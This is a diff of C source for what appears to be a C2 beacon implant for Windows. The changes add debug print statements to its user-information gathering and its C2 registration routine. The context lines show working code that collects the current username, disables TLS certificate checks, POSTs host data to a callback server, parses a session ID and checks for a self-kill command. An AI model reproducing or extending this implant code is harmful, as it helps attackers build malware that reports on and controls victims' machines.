@@ -45,6 +45,8 @@ BOOL GetBasicUserInfo(struct BasicUserInfo *UserInfo)
     GetUserName(chCurrentUser, &dwUserBuf);
     UserInfo->UserName = chCurrentUser;
 
+    printf("UserInfo->UserName: %s\n", UserInfo->UserName);
+
     // set the domain
 
     ZeroMemory(DomainBuf, MAX_PATH);
@@ -106,6 +108,7 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
 
     // initiate the session
 
+    printf("one\n");
     hSession = WinHttpOpen((LPCWSTR)UserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 
     if (!hSession)
@@ -115,7 +118,7 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     }
 
     // do the connection
-
+    printf("two\n");
     hConnect = WinHttpConnect(hSession, (LPCWSTR)CallbackAddress, CallbackPort, 0);
 
     if (!hConnect)
@@ -125,7 +128,7 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     }
 
     // set up the request
-
+    printf("three\n");
     hRequest = WinHttpOpenRequest(hConnect, L"POST", _REGISTER_URL, NULL, NULL, NULL, WINHTTP_FLAG_BYPASS_PROXY_CACHE | WINHTTP_FLAG_SECURE);
 
     if (!hRequest)
@@ -136,8 +139,10 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
 
     // set the flags for our request, basically so we can connect when the c2 ssl cert is fucked
 
-    flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+    // INTERNET_OPTION_HTTP_DECODING
 
+    flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+    printf("four\n");
     if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
     {
         // guess what...
@@ -145,41 +150,56 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     }
 
     // finally send the actual request to the c2
-
+    printf("five\n");
     bResults = WinHttpSendRequest(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)UriBuffer, strlen((char*)UriBuffer), strlen((char*)UriBuffer), 0);
 
     // make sure the request was successful
     if (bResults)
-    {       
+    {
+        printf("WinHttpSendRequest was success\n");       
         bResults = WinHttpReceiveResponse(hRequest, NULL);
+    } else {
+        if (GetLastError() & ERROR_WINHTTP_SECURE_FAILURE)
+        {
+            printf("guess u running windows 7 then lol\n");
+        }
+        
+        printf("WinHttpSendRequest error: %d\n", GetLastError());
     }
 
-    // no lets get the session id
+    printf("bResults: %d\n", bResults);
 
+    // no lets get the session id
     if (bResults)
     {
+        printf("hittin loop\n");
         do
         {
             
             if (!WinHttpQueryDataAvailable( hRequest, &dwSize))
             {
                 // Theres no data avalible
+                printf("WinHttpQueryDataAvailable error\n");
                 return FALSE;
             }
+
+            printf("dwSize: %d\n", dwSize);
 
             if (!WinHttpReadData( hRequest, (LPVOID)ReadBuffer, dwSize, &dwDownloaded))
             {                                  
                 // been an error
+                printf("WinHttpReadData error\n");
                 return FALSE;
             }
 
         } while (dwSize > 0);
         
     }
+    printf("after loops\n");
     
     // clean up the buffer so its parseable
 
-    ReadBuffer[57] = '\0';
+    // ReadBuffer[57] = '\0';
 
     // clean up the request stuffs now we are done with it.
 
@@ -188,12 +208,17 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     WinHttpCloseHandle(hSession);
 
     // now its time to parse the json data in the responce
-
+    printf("six\n");
     parsed_json = json_tokener_parse(ReadBuffer);
+    printf("seven\n");
+
+    // printf("dwSize: %d\n", dwSize);
 
     // get the id and store it in the idbuffer
     parsed_json = json_object_object_get(parsed_json, "id");
     strcpy(IdBuffer, json_object_get_string(parsed_json));
+
+    printf("ID: %s\n", IdBuffer);
 
     // now check we dont need to kill ourselves
     CheckIfDie(&ReadBuffer);
